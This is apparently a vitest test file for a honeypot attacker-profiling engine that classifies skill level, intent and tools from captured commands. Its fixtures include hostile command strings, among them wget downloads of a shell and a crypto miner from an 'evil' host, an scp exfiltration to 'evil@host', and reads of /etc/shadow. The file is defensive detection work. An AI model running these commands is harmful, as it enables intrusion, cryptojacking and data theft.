/**
 * Attacker Profiler tests
 * 攻擊者分析引擎測試
 */

import { describe, it, expect, beforeEach } from 'vitest';
import {
  AttackerProfiler,
  estimateSkillLevel,
  classifyIntent,
  detectTools,
} from '../src/profiler/index.js';
import type { TrapSession } from '../src/types.js';

/** Create a test session / 建立測試連線 */
function createTestSession(overrides: Partial<TrapSession> = {}): TrapSession {
  return {
    sessionId: 'test-session-1',
    serviceType: 'ssh',
    sourceIP: '103.45.67.89',
    sourcePort: 12345,
    startTime: new Date('2025-01-15T10:00:00Z'),
    endTime: new Date('2025-01-15T10:05:00Z'),
    durationMs: 300_000,
    events: [],
    credentials: [],
    commands: [],
    mitreTechniques: [],
    ...overrides,
  };
}

describe('estimateSkillLevel', () => {
  it('should classify empty activity as script_kiddie', () => {
    const result = estimateSkillLevel([], [], []);
    expect(result.level).toBe('script_kiddie');
    expect(result.score).toBe(0);
  });

  it('should classify basic scanning as script_kiddie', () => {
    const result = estimateSkillLevel(['id', 'whoami', 'ls'], ['T1082'], []);
    expect(result.level).toBe('script_kiddie');
  });

  it('should classify tool usage as intermediate', () => {
    const result = estimateSkillLevel(
      ['nmap -sV target', 'hydra -l admin ssh://target'],
      ['T1082', 'T1110'],
      ['nmap', 'Hydra']
    );
    expect(result.level).toBe('intermediate');
  });

  it('should classify advanced patterns as advanced', () => {
    const result = estimateSkillLevel(
      ['base64 -d payload', 'python -c "import socket"', 'wget http://evil/shell.py'],
      ['T1082', 'T1110', 'T1059', 'T1105'],
      ['nmap', 'Hydra']
    );
    const advancedLevels = ['advanced', 'apt'];
    expect(advancedLevels).toContain(result.level);
  });

  it('should classify APT tool usage as apt', () => {
    const result = estimateSkillLevel(
      ['mimikatz.exe', 'cobalt strike beacon', 'bloodhound ingest'],
      ['T1082', 'T1110', 'T1003', 'T1059', 'T1105', 'T1562'],
      ['Mimikatz', 'Cobalt Strike', 'BloodHound', 'nmap']
    );
    expect(result.level).toBe('apt');
    expect(result.score).toBeGreaterThanOrEqual(60);
  });

  it('should cap score at 100', () => {
    const result = estimateSkillLevel(
      Array.from({ length: 20 }, (_, i) => `cmd${i} base64 -d`),
      ['T1', 'T2', 'T3', 'T4', 'T5', 'T6', 'T7', 'T8'],
      ['tool1', 'tool2', 'tool3', 'tool4', 'tool5', 'tool6', 'tool7', 'tool8']
    );
    expect(result.score).toBeLessThanOrEqual(100);
  });
});

describe('classifyIntent', () => {
  it('should classify recon commands as reconnaissance', () => {
    const intent = classifyIntent(['whoami', 'uname -a', 'hostname'], []);
    expect(intent).toBe('reconnaissance');
  });

  it('should classify credential dumping as credential_harvesting', () => {
    const intent = classifyIntent(['cat /etc/shadow', 'mimikatz credential dump'], ['T1003']);
    expect(intent).toBe('credential_harvesting');
  });

  it('should classify miner deployment as cryptomining', () => {
    const intent = classifyIntent(
      ['wget http://evil/xmrig', 'chmod +x xmrig', './xmrig --pool stratum'],
      ['T1496']
    );
    expect(intent).toBe('cryptomining');
  });

  it('should classify ransomware as ransomware_deployment', () => {
    const intent = classifyIntent(['encrypt files lockbit'], []);
    expect(intent).toBe('ransomware_deployment');
  });

  it('should classify data exfil as data_theft', () => {
    const intent = classifyIntent(['tar czf data.tar.gz /home', 'scp data.tar.gz evil@host:'], []);
    expect(intent).toBe('data_theft');
  });

  it('should classify lateral movement', () => {
    const intent = classifyIntent(['ssh admin@192.168.1.100', 'psexec \\\\target'], []);
    expect(intent).toBe('lateral_movement');
  });

  it('should return unknown for empty commands', () => {
    const intent = classifyIntent([], []);
    expect(intent).toBe('unknown');
  });
});

describe('detectTools', () => {
  it('should detect nmap', () => {
    const tools = detectTools(['nmap -sV 192.168.1.1']);
    expect(tools).toContain('nmap');
  });

  it('should detect multiple tools', () => {
    const tools = detectTools([
      'hydra -l admin ssh://target',
      'sqlmap -u http://target/page',
      'nikto -h http://target',
    ]);
    expect(tools).toContain('Hydra');
    expect(tools).toContain('sqlmap');
    expect(tools).toContain('Nikto');
  });

  it('should detect tools from user agents', () => {
    const tools = detectTools([], ['Nmap/7.92', 'WPScan/3.8']);
    expect(tools).toContain('nmap');
    expect(tools).toContain('WPScan');
  });

  it('should return empty for no matches', () => {
    const tools = detectTools(['ls', 'pwd', 'cat file.txt']);
    expect(tools).toHaveLength(0);
  });

  it('should detect APT tools', () => {
    const tools = detectTools(['mimikatz.exe', 'cobalt strike beacon']);
    expect(tools).toContain('Mimikatz');
    expect(tools).toContain('Cobalt Strike');
  });
});

describe('AttackerProfiler', () => {
  let profiler: AttackerProfiler;

  beforeEach(() => {
    profiler = new AttackerProfiler();
  });

  it('should create profile from session', () => {
    const session = createTestSession({
      commands: ['whoami', 'id'],
      mitreTechniques: ['T1082'],
      credentials: [
        { timestamp: new Date(), username: 'admin', password: '123456', grantedAccess: false },
      ],
    });

    const profile = profiler.processSession(session);
    expect(profile.profileId).toBeTruthy();
    expect(profile.sourceIPs).toContain('103.45.67.89');
    expect(profile.totalSessions).toBe(1);
    expect(profile.skillLevel).toBeDefined();
    expect(profile.credentialPatterns.totalAttempts).toBe(1);
    expect(profile.credentialPatterns.commonUsernames).toContain('admin');
  });

  it('should update profile on repeated sessions from same IP', () => {
    const session1 = createTestSession({
      sourceIP: '1.2.3.4',
      commands: ['whoami'],
      mitreTechniques: ['T1082'],
    });
    const session2 = createTestSession({
      sessionId: 'test-2',
      sourceIP: '1.2.3.4',
      commands: ['cat /etc/passwd'],
      mitreTechniques: ['T1003'],
    });

    profiler.processSession(session1);
    const updated = profiler.processSession(session2);

    expect(updated.totalSessions).toBe(2);
    expect(updated.mitreTechniques).toContain('T1082');
    expect(updated.mitreTechniques).toContain('T1003');
  });

  it('should create separate profiles for different IPs', () => {
    const session1 = createTestSession({ sourceIP: '1.2.3.4' });
    const session2 = createTestSession({ sessionId: 'test-2', sourceIP: '5.6.7.8' });

    profiler.processSession(session1);
    profiler.processSession(session2);

    expect(profiler.getProfileCount()).toBe(2);
  });

  it('should retrieve profile by ID and IP', () => {
    const session = createTestSession();
    const profile = profiler.processSession(session);

    expect(profiler.getProfile(profile.profileId)).toBeDefined();
    expect(profiler.getProfileByIP('103.45.67.89')).toBeDefined();
    expect(profiler.getProfileByIP('unknown')).toBeUndefined();
  });

  it('should get top attackers sorted by risk', () => {
    // Create sessions with varying skill levels
    const simple = createTestSession({ sourceIP: '1.1.1.1', commands: ['ls'] });
    const advanced = createTestSession({
      sessionId: 'test-2',
      sourceIP: '2.2.2.2',
      commands: ['nmap -sV target', 'hydra -l admin ssh://target', 'base64 -d payload'],
      mitreTechniques: ['T1082', 'T1110', 'T1059', 'T1105'],
    });

    profiler.processSession(simple);
    profiler.processSession(advanced);

    const top = profiler.getTopAttackers(1);
    expect(top).toHaveLength(1);
    expect(top[0]!.sourceIPs).toContain('2.2.2.2');
  });

  it('should link session to profile', () => {
    const session = createTestSession();
    const profile = profiler.processSession(session);
    expect(session.attackerProfileId).toBe(profile.profileId);
  });

  it('should clear all profiles', () => {
    profiler.processSession(createTestSession());
    expect(profiler.getProfileCount()).toBe(1);

    profiler.clear();
    expect(profiler.getProfileCount()).toBe(0);
  });

  it('should never downgrade skill level', () => {
    const advancedSession = createTestSession({
      sourceIP: '1.2.3.4',
      commands: ['nmap -sV', 'hydra brute', 'base64 -d payload', 'python -c script'],
      mitreTechniques: ['T1082', 'T1110', 'T1059', 'T1105'],
    });
    const profile1 = profiler.processSession(advancedSession);
    const firstLevel = profile1.skillLevel;

    const simpleSession = createTestSession({
      sessionId: 'test-2',
      sourceIP: '1.2.3.4',
      commands: ['ls'],
      mitreTechniques: [],
    });
    const profile2 = profiler.processSession(simpleSession);

    // Skill level should be same or higher
    const SKILL_ORDER = ['script_kiddie', 'intermediate', 'advanced', 'apt'];
    expect(SKILL_ORDER.indexOf(profile2.skillLevel)).toBeGreaterThanOrEqual(
      SKILL_ORDER.indexOf(firstLevel)
    );
  });
});
